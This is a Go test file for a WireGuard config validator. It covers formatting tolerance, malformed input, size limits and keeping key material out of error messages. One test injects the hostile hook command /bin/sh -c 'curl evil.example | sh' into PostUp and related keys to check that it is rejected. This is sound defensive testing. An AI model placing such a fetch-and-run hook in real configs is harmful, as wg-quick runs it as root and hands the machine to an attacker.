package tunnel

import (
	"strings"
	"testing"
)

const validConfig = `[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5cHJpdmE=
Address = 10.8.0.5/32
DNS = 1.1.1.1, 1.0.0.1
MTU = 1420

[Peer]
PublicKey = c2VydmVycHVibGlja2V5c2VydmVycHVibGlja2V5c2VydmU=
PresharedKey = cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHM=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.com:51820
PersistentKeepalive = 25
`

func TestValidateConfigAcceptsARealConfig(t *testing.T) {
	if err := ValidateConfig(validConfig); err != nil {
		t.Fatalf("a config the control plane produces was rejected: %v", err)
	}
}

func TestValidateConfigToleratesFormatting(t *testing.T) {
	configs := map[string]string{
		"comments and blank lines": "# a comment\n\n" + validConfig,
		// Windows editors and PowerShell's own `Set-Content -Encoding utf8`
		// emit one. It hides in front of `[Interface]` and is invisible in a
		// diff, which is exactly how it wasted an afternoon.
		"utf-8 byte order mark": "\ufeff" + validConfig,
		"crlf line endings": "[Interface]\r\nPrivateKey = k\r\nAddress = 10.8.0.5/32\r\n" +
			"\r\n[Peer]\r\nPublicKey = p\r\nAllowedIPs = 0.0.0.0/0\r\n",
		"lowercase keys": "[interface]\nprivatekey = k\naddress = 10.8.0.5/32\n" +
			"\n[peer]\npublickey = p\nallowedips = 0.0.0.0/0\n",
		"extra whitespace": "  [Interface]  \n  PrivateKey   =   k  \n\n  [Peer]  \n  PublicKey = p\n",
	}

	for name, config := range configs {
		t.Run(name, func(t *testing.T) {
			if err := ValidateConfig(config); err != nil {
				t.Fatalf("rejected: %v", err)
			}
		})
	}
}

// The reason this validator exists. wg-quick runs these as root.
func TestValidateConfigRejectsShellHooks(t *testing.T) {
	hooks := []string{"PostUp", "PostDown", "PreUp", "PreDown"}

	for _, hook := range hooks {
		t.Run(hook, func(t *testing.T) {
			config := "[Interface]\nPrivateKey = k\n" +
				hook + " = /bin/sh -c 'curl evil.example | sh'\n" +
				"\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n"

			if err := ValidateConfig(config); err == nil {
				t.Fatalf("%s was accepted — this is arbitrary code execution as root", hook)
			}
		})
	}
}

func TestValidateConfigRejectsOtherDangerousKeys(t *testing.T) {
	// Table = off disables wg-quick's routing, which would silently send
	// traffic outside the tunnel. SaveConfig lets the file rewrite itself.
	for _, key := range []string{"Table", "SaveConfig"} {
		t.Run(key, func(t *testing.T) {
			config := "[Interface]\nPrivateKey = k\n" + key + " = off\n" +
				"\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n"
			if err := ValidateConfig(config); err == nil {
				t.Fatalf("%s was accepted", key)
			}
		})
	}
}

func TestValidateConfigRejectsMalformedInput(t *testing.T) {
	cases := map[string]string{
		"empty":                  "",
		"whitespace only":        "   \n\t\n",
		"no private key":         "[Interface]\nAddress = 10.8.0.5/32\n\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n",
		"no peer":                "[Interface]\nPrivateKey = k\nAddress = 10.8.0.5/32\n",
		"unknown section":        "[Script]\nRun = x\n",
		"key before any section": "PrivateKey = k\n[Interface]\n",
		"not a pair":             "[Interface]\nPrivateKey\n",
		"empty value":            "[Interface]\nPrivateKey =\n\n[Peer]\nPublicKey = p\n",
		"peer key in interface":  "[Interface]\nPrivateKey = k\nEndpoint = x:1\n\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n",
		"interface key in peer":  "[Interface]\nPrivateKey = k\n\n[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\nPrivateKey = k\n",
	}

	for name, config := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateConfig(config); err == nil {
				t.Fatal("accepted")
			}
		})
	}
}

func TestNormalizeConfigStripsWhatToolsChokeOn(t *testing.T) {
	normalized := NormalizeConfig("\ufeff[Interface]\r\nPrivateKey = k\r\n")

	if strings.HasPrefix(normalized, "\ufeff") {
		t.Fatal("the byte order mark survived")
	}
	if strings.Contains(normalized, "\r") {
		t.Fatal("carriage returns survived; wg-quick would read them as part of the value")
	}
	if normalized != "[Interface]\nPrivateKey = k\n" {
		t.Fatalf("unexpected result: %q", normalized)
	}
}

func TestValidateConfigRejectsAnOversizedConfig(t *testing.T) {
	huge := "[Interface]\nPrivateKey = k\nAddress = "
	for len(huge) < 70*1024 {
		huge += "10.8.0.5/32,"
	}
	if err := ValidateConfig(huge); err == nil {
		t.Fatal("an oversized config was accepted")
	}
}

// The rejection message goes to the user, so it must not carry the key.
func TestValidateConfigErrorDoesNotLeakKeyMaterial(t *testing.T) {
	const secret = "SUPERSECRETPRIVATEKEYMATERIAL="
	config := "[Interface]\nPrivateKey = " + secret + "\nPostUp = evil\n\n[Peer]\nPublicKey = p\n"

	err := ValidateConfig(config)
	if err == nil {
		t.Fatal("expected a rejection")
	}

	failure, ok := err.(*FailureError)
	if !ok {
		t.Fatalf("expected a *FailureError, got %T", err)
	}
	if contains(failure.UserMessage(), secret) {
		t.Fatalf("the user-facing message leaked key material: %q", failure.UserMessage())
	}
}

func contains(haystack, needle string) bool {
	return len(haystack) >= len(needle) && (func() bool {
		for i := 0; i+len(needle) <= len(haystack); i++ {
			if haystack[i:i+len(needle)] == needle {
				return true
			}
		}
		return false
	})()
}
